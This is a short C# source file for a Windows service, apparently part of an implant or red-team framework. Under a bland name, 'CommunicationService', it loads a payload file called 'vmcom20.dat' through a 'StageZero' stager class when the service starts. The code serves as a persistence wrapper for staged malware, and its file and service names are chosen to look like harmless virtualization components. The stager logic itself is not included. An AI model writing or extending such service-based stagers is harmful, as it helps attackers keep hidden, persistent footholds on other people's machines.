using System;
using System.IO;
using System.ServiceProcess;
using System.Timers;
using Stager;

namespace CommunicationService
{
    public class CommunicationService : ServiceBase
    {
        StageZero stager;
        Timer timer;
        public CommunicationService()
        {
            timer = new Timer(1000);
            timer.AutoReset = true;
            timer.Enabled = true;
            timer.Elapsed += new ElapsedEventHandler(delegate (object s, ElapsedEventArgs e)
            {
                Console.WriteLine();
            });
        }

        protected override void OnStart(string[] args)
        {
            base.OnStart(args);
            string filepath = AppDomain.CurrentDomain.BaseDirectory + @"\vmcom20.dat";
            FileInfo f = new FileInfo(filepath);
            stager = new StageZero(f, 5, 5);
            timer.Start();
            Console.Read();
        }

        protected override void OnStop()
        {
            base.OnStop();
            timer.Stop();
        }
    }
}
